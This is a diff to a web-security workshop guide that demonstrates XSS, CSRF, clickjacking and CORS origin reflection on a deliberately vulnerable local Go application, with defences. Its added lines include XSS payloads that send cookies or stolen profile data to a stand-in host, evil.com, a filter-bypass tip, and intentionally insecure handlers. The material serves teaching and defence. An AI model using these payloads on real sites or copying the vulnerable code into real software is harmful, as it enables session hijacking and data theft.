@@ -2,14 +2,14 @@
 
 ## Purpose
 
-In this workshop, you will learn the mechanisms of and countermeasures against common Web application vulnerabilities: XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), Clickjacking, and CORS (Cross-Origin Resource Sharing) misconfigurations, using an intentionally vulnerable application.
+In this workshop, you will learn the mechanisms of and countermeasures against common Web application vulnerabilities: XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), Clickjacking, and CORS (Cross-Origin Resource Sharing) misconfigurations. You will use an intentionally vulnerable application to experience these attacks and learn how to defend against them.
 
 ## Goals
 
 - Understand the mechanisms of XSS (Stored/Reflected) and verify JavaScript execution.
 - Understand the mechanism of CSRF and verify how unauthorized requests are sent on behalf of an authenticated user.
 - Understand the mechanism of Clickjacking and verify visual deception techniques using iframes.
-- Understand the mechanism of information leakage due to CORS misconfigurations and verify the importance of proper origin control.
+- Understand the mechanism of data leakage due to CORS misconfigurations and verify the importance of proper origin control.
 - Understand defensive measures (escaping, tokens, header settings, CORS settings) for each vulnerability.
 
 ---
@@ -71,7 +71,7 @@ graph TD
 
 ### Cross-Origin Data Leakage (CORS Misconfiguration)
 
-A vulnerability where an attacker can obtain a user's sensitive data due to CORS misconfigurations (specifically `Access-Control-Allow-Origin: *`).
+A vulnerability where an attacker can obtain a user's sensitive data due to CORS misconfigurations (specifically Origin Reflection).
 
 ```mermaid
 sequenceDiagram
@@ -91,9 +91,9 @@ sequenceDiagram
     B->>S: GET /api/sensitive-data<br/>Origin: evil.com<br/>Cookie: session_id=...
 
     Note over S: 4. Server authenticates via Cookie
-    S->>B: 200 OK<br/>Access-Control-Allow-Origin: *<br/>{"data": "secret"}
+    S->>B: 200 OK<br/>Access-Control-Allow-Origin: evil.com<br/>Access-Control-Allow-Credentials: true<br/>{"data": "secret"}
 
-    Note over B, E: 5. Browser checks CORS (* allows all)
+    Note over B, E: 5. Browser checks CORS
     B->>E: Passes response to JavaScript
 
     Note over E: 6. Attacker obtains sensitive data
@@ -103,9 +103,9 @@ sequenceDiagram
 **Why does the attack succeed?**
 
 1. **User is logged in**: The Cookie is stored in the browser.
-2. **CORS is too permissive**: `Access-Control-Allow-Origin: *` allows the response to be read from any origin.
+2. **CORS configuration is too weak (over-permissive)**: Origin Reflection (returning the Origin header as-is) allows the response to be read from any origin.
 3. **Cookie is sent automatically**: The Cookie is sent even for cross-origin requests.
-4. **Browser allows the response**: Since the CORS policy is `*`, JavaScript can read the response.
+4. **Browser allows access to the response**: Due to Origin Reflection, the `Access-Control-Allow-Origin` matches the attacker's origin, allowing JavaScript to read the response data.
 
 ---
 
@@ -113,36 +113,45 @@ sequenceDiagram
 
 | Vulnerability | ❌ Dangerous Implementation | ✅ Secure Countermeasure |
 | :--- | :--- | :--- |
-| **XSS** | Output user input as-is in HTML | Escape output appropriately, set CSP |
+| **XSS** | Output user input as-is in HTML without escaping | Escape output appropriately, set CSP |
 | **CSRF** | Rely solely on Cookies for authentication | Use CSRF tokens, set SameSite attribute |
 | **Clickjacking** | Allow iframe embedding from external sites | Set `X-Frame-Options` or CSP `frame-ancestors` |
-| **CORS Misconfig** | Use `Access-Control-Allow-Origin: *` | Allow only specific origins; use `*` carefully |
+| **CORS Misconfig** | Origin Reflection (returning the Origin header as-is) | Allow only specific origins from an allowlist |
 
 ---
 
 ## Architecture
 
-This workshop provides both "Victim Site" and "Attacker Site" endpoints within a single Go application.
+In this workshop, two Go applications run on different ports. The "Victim Site" and "Attacker Site" have different origins, allowing for a realistic demonstration of CSRF and CORS attacks.
 
 ### Directory Structure
 
 ```text
 infra/assets/web_security/
-├── main.go         # Vulnerable application
-├── go.mod
-├── Dockerfile
-└── docker-compose.yml
+├── victim/
+│   ├── main.go         # Victim Site (port 8080)
+│   └── go.mod
+└── attacker/
+    ├── main.go         # Attacker Site (port 8081)
+    └── go.mod
 ```
 
 ---
 
 ## Preparation
 
-### 1. Start the Application
+### 1. Start the Applications
+
+Open two terminals and start each server.
 
 ```bash
-cd infra/assets/web_security
-podman compose up -d
+# Terminal 1: Victim Site
+cd infra/assets/web_security/victim
+go run main.go
+
+# Terminal 2: Attacker Site
+cd infra/assets/web_security/attacker
+go run main.go
 ```
 
 ### 2. Verification
@@ -160,21 +169,34 @@ Save a script in a board-like function and verify it executes every time the pag
 **Instructions:**
 
 1. Navigate to the `Stored XSS Demo` page.
-2. Enter `<script>alert('XSS!');</script>` into the input field and submit.
-3. Verify that the page reloads and the alert is displayed.
-4. Refresh the page and verify that the alert is displayed again (because it is saved in the database).
+2. First, click the `Login` button to set the session Cookie.
+3. Enter the following script into the input field and submit:
+
+   ```html
+   <script>alert('XSS: your cookie: ' + document.cookie);</script>
+   ```
+
+4. Verify that the page reloads and the alert displays the Cookie value.
+5. Refresh the page and verify that the alert is displayed again (because it is saved in the database).
 
 **What is happening?**
 
 ```text
-User Input: <script>alert('XSS!');</script>
+User Input: <script>alert(...)</script>
           ↓ (Saved without escaping)
-Database:   <script>alert('XSS!');</script>
+Database:   <script>alert(...)</script>
           ↓ (Output directly to HTML)
 Browser:    Recognized as <script> tag → JavaScript executed
+
+Real-world attack script:
+  new Image().src="https://evil.com/steal?c="+document.cookie
+
+  → Cookie is sent to the attacker's server.
+  → Why use an Image object? It has fewer restrictions than fetch/XMLHttpRequest
+    and can send data externally just by requesting a URL.
 ```
 
-**Vulnerable Code (main.go:121-126):**
+**Vulnerable Code (victim/main.go:77-80):**
 
 ```go
 for _, c := range data.Comments {
@@ -185,7 +207,8 @@ for _, c := range data.Comments {
 
 **Attack Variations:**
 
-- `<script>document.location='http://evil.com?c='+document.cookie;</script>` → Cookie theft
+- `<script>document.location='http://evil.com?c='+document.cookie;</script>` → Cookie theft (noticeable as it redirects)
+- `<script>new Image().src="https://evil.com/steal?c="+document.cookie;</script>` → Cookie theft (less noticeable)
 - `<script>window.top.location='http://fake-bank.com';</script>` → Redirection to a phishing site
 
 ---
@@ -198,26 +221,34 @@ Verify that a script contained in URL parameters is reflected directly on the pa
 
 1. Navigate to the `Reflected XSS Demo` page.
 2. Access the URL with a script appended to the end:
-   - `http://localhost:8080/xss/reflected?q=<script>alert(document.cookie);</script>`
-3. Verify that the cookie information is displayed (accessible because the HttpOnly attribute is missing).
+
+   ```text
+   http://localhost:8080/xss/reflected?q=<img src=x onerror=alert(document.cookie)>
+   ```
+
+   *Note: Many modern browsers automatically block `<script>` tags in Reflected XSS. Using `<img onerror>` often bypasses these filters.*
 
 **What is happening?**
 
 ```text
-URL Parameter: q=<script>alert(document.cookie);</script>
+URL Parameter: q=<img src=x onerror=alert(document.cookie)>
             ↓ (Embedded in HTML without escaping)
-HTML Output:   <p>Search results for "<script>alert(document.cookie);</script>"...</p>
+HTML Output:   <p>0 results found for "<img src=x onerror=alert(document.cookie)>".</p>
             ↓ (Interpreted as HTML by browser)
-Execution:     JavaScript runs
+            → <img> fails to load src=x
+            → onerror event handler executes → JavaScript runs
+
+*Note: While <script> tags might be blocked by browser XSS filters,
+       <img onerror> can often bypass them.
 ```
 
-**Vulnerable Code (main.go:129-132):**
+**Vulnerable Code (victim/main.go:84-89):**
 
 ```go
 func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
     q := r.URL.Query().Get("q")
     // ❌ Vulnerability: Embed query parameter directly into HTML
-    fmt.Fprintf(w, "<h1>Search Results</h1><p>Results for \"%s\" were 0.</p>", q)
+    fmt.Fprintf(w, "<h1>Search Results</h1><p>0 results found for \"%s\".</p>", q)
 }
 ```
 
@@ -225,7 +256,7 @@ func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
 
 ```text
 Attacker-crafted URL:
-http://victim-site.com/search?q=<script>location='http://evil.com/steal?c='+document.cookie</script>
+http://victim-site.com/search?q=<img src=x onerror="new Image().src='https://evil.com/steal?c='+document.cookie">
 
 ↓ User clicks link in an email
 
@@ -243,9 +274,9 @@ Tricks an authenticated user into sending an unintended request.
 1. Click `Login` to set the session Cookie.
    - Verify that `session_id` is set in DevTools → Application → Cookies.
 2. Return to the `Victim Site` top page and confirm the current email is `victim@example.com`.
-3. Click `CSRF Attack Page` under `Attacker's Links`.
-4. Click the "Claim Prize!" button on the attacker's site.
-5. Return to the top page of the victim site and verify that the email address has been changed to `hacker@evil.com` without your authorization.
+3. Click the `CSRF Attack Page (port 8081)` link to go to the attacker's site (different origin: localhost:8081).
+4. Click the "Claim Prize" button on the attacker's site.
+5. Return to the top page of the victim site and verify that the email address has been changed to `hacker@evil.com`.
 
 **What is happening?**
 
@@ -253,7 +284,7 @@ Tricks an authenticated user into sending an unintended request.
 [Attacker Site HTML]
 <form action="http://localhost:8080/update-email" method="POST">
     <input type="hidden" name="email" value="hacker@evil.com">
-    <input type="submit" value="Claim Prize!">
+    <input type="submit" value="Claim Prize">
 </form>
 
 ↓ User clicks the button
@@ -296,10 +327,11 @@ Uses a transparent iframe to make the user click a button different from the one
 
 **Instructions:**
 
-1. Click `Clickjacking Attack Page` under `Attacker's Links`.
-2. A "Free Cookies Available!" page is displayed.
-3. Notice the faintly visible "Confirm Transfer" page from the victim site behind the "GET COOKIES" button (semi-transparent for demonstration).
-4. When you click "GET COOKIES", you are actually clicking the hidden "Confirm Transfer" button.
+1. Click `Clickjacking Attack Page` under `Attacker Site (port 8081)`.
+2. A "Free Donuts Available!" page is displayed.
+3. Notice the faintly visible "Follow @hacker" page from the victim site behind the "GET DONUTS" button (semi-transparent for demonstration).
+4. When you click "GET DONUTS", you are actually clicking the hidden "Follow" button.
+5. You end up following @hacker without intending to.
 
 **What is happening?**
 
@@ -316,35 +348,35 @@ Uses a transparent iframe to make the user click a button different from the one
 #fake-page {
     position: absolute;
     z-index: 1;          /* Background layer */
-    /* "Free Cookie" fake page */
+    /* "Free Donut" fake page */
 }
 ```text
 ┌─────────────────────────────────────┐
 │    [Attacker Fake Page - z-index: 1]│
-│  🍪 Free Cookies Available!         │
+│  🍩 Free Donuts Available!          │
 │                                     │
 │     ┌───────────────────────────┐   │
 │     │ [Victim Site iframe]      │   │
 │     │ z-index: 2 (Foreground)   │   │
-│     │ Confirm Transfer          │   │
-│     │ [Transfer $1000] Button   │   │ ← Transparent/Semi-transparent
+│     │ Follow @hacker            │   │
+│     │ [Follow] Button           │   │ ← Transparent/Semi-transparent
 │     └───────────────────────────┘   │
 │                                     │
-│         [GET COOKIES] Button        │ ← Fake button
+│         [GET DONUTS] Button         │ ← Fake button
 │         (Actually above iframe's)   │
 └─────────────────────────────────────┘
 ```
 
-**Vulnerable Code (main.go:162-182):**
+**Vulnerable Code (victim/main.go:119-139):**
 
 ```go
-func transferHandler(w http.ResponseWriter, r *http.Request) {
+func followHandler(w http.ResponseWriter, r *http.Request) {
     // ❌ Vulnerability: Missing X-Frame-Options header
     // This allows the page to be displayed within an iframe on other sites
 
     fmt.Fprintf(w, `
-        <h1>Confirm Transfer</h1>
-        <button>Confirm Transfer</button>
+        <h1>Follow @hacker</h1>
+        <button>Follow</button>
     `)
 }
 ```
@@ -355,6 +387,98 @@ func transferHandler(w http.ResponseWriter, r *http.Request) {
 // Attackers identify the position of the victim's button and adjust the fake button
 // padding-top: 105px → Matches the position of the victim's button
 ```
+
+---
+
+### STEP 5: CORS Misconfiguration (Cross-Origin Data Leakage) - Data Theft from Other Sites
+
+If an API performs Origin Reflection (returning the request's Origin header as-is), an attacker site can send requests with Cookies and obtain the user's sensitive data.
+
+**Instructions:**
+
+1. Navigate to the Victim Site (port 8080) and click `Login` to set the session Cookie.
+2. Click the `CORS Attack Page (port 8081)` link.
+3. Click the "Verify Account" button.
+4. Verify that the name, email, and API key are stolen from `/api/profile` of the victim site and displayed on the screen.
+
+**What is happening?**
+
+```text
+[Attacker Site JavaScript]
+fetch('http://localhost:8080/api/profile', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => { /* Display data */ })
+
+↓ Browser sends Preflight request
+
+OPTIONS /api/profile HTTP/1.1
+Host: localhost:8080
+Origin: http://localhost:8081
+
+↓ Victim Server response (❌ Vulnerability: Origin Reflection)
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: http://localhost:8081   ← Origin Reflection!
+Access-Control-Allow-Credentials: true
+
+↓ Browser sends actual request
+
+GET /api/profile HTTP/1.1
+Host: localhost:8080
+Origin: http://localhost:8081
+Cookie: session_id=secret-session-123  ← Sent because credentials: 'include'!
+
+↓ Victim Server response
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: http://localhost:8081   ← Origin Reflection
+Access-Control-Allow-Credentials: true
+Content-Type: application/json
+
+{"name":"Alice Victim","email":"victim@example.com","secret":"my-secret-api-key-abc123"}
+
+↓ Browser CORS check
+
+Origin matches → Allowed
+→ Attacker site's JavaScript can read the response!
+```
+
+**Vulnerable Code (victim/main.go:141-):**
+
+```go
+func profileHandler(w http.ResponseWriter, r *http.Request) {
+    // ❌ Vulnerability: Origin Reflection
+    origin := r.Header.Get("Origin")
+    w.Header().Set("Access-Control-Allow-Origin", origin)
+    w.Header().Set("Access-Control-Allow-Credentials", "true")
+
+    // Returns authenticated user's sensitive data
+    json.NewEncoder(w).Encode(profile)
+}
+```
+
+**Why does the attack succeed?**
+
+1. **User is logged in**: The Cookie is stored in the browser.
+2. **Origin Reflection**: The server returns the Origin header without validation, allowing any origin.
+3. **Credentials Allowed**: `Access-Control-Allow-Credentials: true` permits sending Cookies.
+4. **Preflight Pass**: The same reflection occurs for OPTIONS requests.
+
+**In a real attack:**
+
+```text
+The attacker sends stolen data to their own server:
+new Image().src='https://evil.com/collect?d='+JSON.stringify(data)
+```
+
+**Comparison: `Access-Control-Allow-Origin: *` vs `Origin Reflection`**
+
+| Feature | ACAO: * | Origin Reflection |
+| :--- | :--- | :--- |
+| **Allowed Target** | Everyone | Everyone (granted individually) |
+| **Credentials (Cookie)** | Not allowed | Allowed (Extremely Dangerous) |
+| **Primary Use Case** | Public APIs, static files | Debugging during development (Don't use in production!) |
+| **Security** | Relatively safe (public data only) | Vulnerability (source of data leaks) |
 
 ---
 
@@ -379,7 +503,7 @@ import (
 func storedXSSHandler(w http.ResponseWriter, r *http.Request) {
     // Template definition ({{.}} is automatically escaped)
     tmpl := template.Must(template.New("comments").Parse(`
-        <h1>Comments</h1>
+        <h1>Comments List</h1>
         <ul>
         {{range .Comments}}
             <li>{{.}}</li>  ← Special characters in {{.}} are automatically converted to &lt; &gt; etc.
@@ -615,6 +739,10 @@ http.SetCookie(w, &http.Cookie{
     Name:     "session_id",
     Value:    "secret-session-123",
     SameSite: http.SameSiteStrictMode,  // ✅ Sends Cookie only for requests from the same site
+    // SameSite levels:
+    //   - Strict: Completely restricted to same-site (not sent even on top-level navigation)
+    //   - Lax:    Sent for top-level navigation (GET, etc.) (Recommended)
+    //   - None:   Always sent (Vulnerable)
 })
 ```
 
@@ -645,7 +773,7 @@ Different Origin:
 
 **Why is CORS Necessary?**
 
-Browsers have a security mechanism called **Same-Origin Policy**, which restricts requests to different origins. CORS is a mechanism to safely relax this restriction.
+Browsers have a security mechanism called **Same-Origin Policy (SOP)**, which restricts requests to different origins. CORS is a mechanism to safely relax this restriction.
 
 **What Happens Without CORS?**
 
@@ -835,20 +963,122 @@ fetch() from attacker site → Request can be sent
 #### 1. X-Frame-Options Header
 
 ```go
-func transferHandler(w http.ResponseWriter, r *http.Request) {
+func followHandler(w http.ResponseWriter, r *http.Request) {
     // ✅ Completely prohibit iframe embedding
     w.Header().Set("X-Frame-Options", "DENY")
+
+    // Or, allow only the same origin
+    // w.Header().Set("X-Frame-Options", "SAMEORIGIN")
+
+    fmt.Fprintf(w, "<h1>Follow @hacker</h1>...")
 }
 ```
+
+**Header Values and Effects:**
+
+| Value | Effect |
+| :--- | :--- |
+| `DENY` | Rejects all iframe embedding |
+| `SAMEORIGIN` | Allows embedding only from the same origin |
+| `ALLOW-FROM uri` | Allows only a specific origin (Deprecated) |
 
 #### 2. Content-Security-Policy (CSP)
 
 ```go
-func transferHandler(w http.ResponseWriter, r *http.Request) {
+func followHandler(w http.ResponseWriter, r *http.Request) {
     // ✅ Control iframe embedding with frame-ancestors
     w.Header().Set("Content-Security-Policy",
         "frame-ancestors 'self';")  // Allow only same-site
+
+    // To completely prohibit
+    w.Header().Set("Content-Security-Policy",
+        "frame-ancestors 'none';")
 }
+```
+
+**Verifying CSP:**
+
+```bash
+# Check in Browser DevTools
+# Console: "Refused to display ... in a frame because it set 'X-Frame-Options' to 'deny'."
+```
+
+---
+
+### CSP (Content Security Policy) Deep Dive
+
+#### What is CSP?
+
+CSP is an HTTP response header that tells the browser which sources of resources (scripts, images, styles, etc.) are allowed for the current page. It is a powerful defense layer that significantly mitigates XSS risks.
+
+**Without CSP:**
+
+```text
+Browser: Executes all <script> tags on the page.
+         → Malicious injections like <script>alert(document.cookie)</script> run.
+```
+
+**With CSP:**
+
+```text
+Server:  Content-Security-Policy: script-src 'self'
+Browser: "Only execute scripts that come from the same origin ('self')."
+         → Inline <script> tags are blocked.
+         → Injected scripts are not executed ✓
+```
+
+#### How CSP Works
+
+1. **Server declares policy** via HTTP response header.
+2. **Browser evaluates policy** during page load.
+3. **Violations are blocked** and optionally reported to a specified URI.
+
+#### Common Directives
+
+| Directive | Controls | Example |
+| :--- | :--- | :--- |
+| `script-src` | Where JavaScript can be loaded from | `'self'`, `'unsafe-inline'`, `'nonce-abc'` |
+| `style-src` | Where CSS can be loaded from | `'self'`, `'unsafe-inline'` |
+| `img-src` | Where images can be loaded from | `'self'`, `https://images.example.com` |
+| `connect-src` | Destinations for fetch/XHR/WebSockets | `'self'`, `https://api.example.com` |
+| `frame-ancestors` | Which pages can embed this page | `'none'`, `'self'` (Clickjacking defense) |
+| `default-src` | Fallback for other directives | `'self'` |
+
+#### Source Values
+
+| Value | Meaning | Risk |
+| :--- | :--- | :--- |
+| `'self'` | Same origin only | Safe (Recommended) |
+| `'none'` | Allow nothing | Safest |
+| `'unsafe-inline'` | Allow inline scripts/styles | Dangerous (Negates XSS protection) |
+| `'nonce-<value>'` | Only allow scripts with matching nonce attribute | Safe (Recommended) |
+| `https://...` | Allow specific domain | Moderate |
+
+#### Step-by-Step CSP Implementation
+
+**Step 1: Report-Only Mode (No Impact)**
+
+```go
+w.Header().Set("Content-Security-Policy-Report-Only",
+    "default-src 'self'; report-uri /csp-report")
+```
+
+**Step 2: Lenient Policy (Migration Phase)**
+
+```go
+w.Header().Set("Content-Security-Policy",
+    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'")
+```
+
+**Step 3: Strict Policy (Nonce-based, Recommended)**
+
+```go
+nonce := generateNonce()
+w.Header().Set("Content-Security-Policy",
+    "default-src 'none'; script-src 'nonce-" + nonce + "'; style-src 'self'; frame-ancestors 'none'")
+
+// HTML
+fmt.Fprintf(w, `<script nonce="%s">console.log('Safe script');</script>`, nonce)
 ```
 
 ---
@@ -873,17 +1103,24 @@ func transferHandler(w http.ResponseWriter, r *http.Request) {
 
 ### DOM-based XSS
 
-Unlike traditional XSS, the server response is not vulnerable; the vulnerability arises when client-side JavaScript performs DOM operations.
+Unlike traditional XSS, the server response is not vulnerable; the vulnerability arises when client-side JavaScript performs DOM operations unsafely.
 
 ```javascript
 // Vulnerable Code Example
-const hash = location.hash.substring(1);  // Get everything after # in URL
-document.getElementById("output").innerHTML = hash;  // Insert without escaping
+const hash = location.hash.substring(1);
+document.getElementById("output").innerHTML = hash;  // Direct insertion
+
+// Attack URL: http://victim.com/#<img src=x onerror=alert('XSS')>
 ```
+
+**Countermeasures:**
+
+- Use `textContent` or `innerText` instead of `innerHTML`.
+- Use sanitization libraries like DOMPurify.
 
 ### Self-XSS
 
-An attacker tricks a user into executing a malicious script themselves, often by claiming it's a "required command."
+An attacker tricks a user into executing a malicious script themselves, often by claiming it's a "required command" to gain extra features.
 
 ---
 
@@ -892,7 +1129,7 @@ An attacker tricks a user into executing a malicious script themselves, often by
 ### Quiz
 
 1. **What is the difference between Stored XSS and Reflected XSS?**
-   - <details><summary>Answer</summary>Stored XSS saves the attack code on the server, executing it whenever anyone views the page. Reflected XSS is executed immediately via URL parameters and is not saved.</details>
+   - <details><summary>Answer</summary>Stored XSS saves the attack code on the server, executing it whenever the page is viewed. Reflected XSS is executed immediately via URL parameters and is not saved on the server.</details>
 
 2. **Why are Cookies sent during a CSRF attack?**
    - <details><summary>Answer</summary>Browsers automatically attach Cookies to requests sent to the same origin. Without the SameSite attribute, they are sent even for requests originating from other sites.</details>
@@ -903,13 +1140,14 @@ An attacker tricks a user into executing a malicious script themselves, often by
 4. **Can a Cookie with the HttpOnly attribute be read by JavaScript?**
    - <details><summary>Answer</summary>No, a Cookie with the HttpOnly attribute cannot be read via `document.cookie`. This prevents Cookie theft via XSS.</details>
 
+5. **Why is Origin Reflection dangerous?**
+   - <details><summary>Answer</summary>Origin Reflection allows any origin to access the response. Combined with `Access-Control-Allow-Credentials: true`, it enables an attacker site to steal sensitive data using the victim's session Cookie.</details>
+
 ---
 
 ## Cleanup
 
-```bash
-podman compose down
-```
+Press `Ctrl+C` in each terminal to stop the servers.
 
 ---
 
@@ -917,15 +1155,15 @@ podman compose down
 
 ### Q: No alert is displayed
 
-**A:** Your browser's XSS Auditor or similar features might be blocking the attack.
+**A:** Your browser's XSS Auditor or similar features might be blocking the attack. Check the Console for errors.
 
 ### Q: Email address is not changed after a CSRF attack
 
-**A:** Check if the Cookie is set and the form action URL is correct.
+**A:** Ensure you have logged in and the session Cookie is set. Check the form action URL on the attacker site.
 
 ### Q: Clickjacking iframe is not displayed
 
-**A:** Your browser's iframe blocking features might be active.
+**A:** Ensure both Victim and Attacker sites are running. Check if the browser's iframe blocking features are active.
 
 ---
 
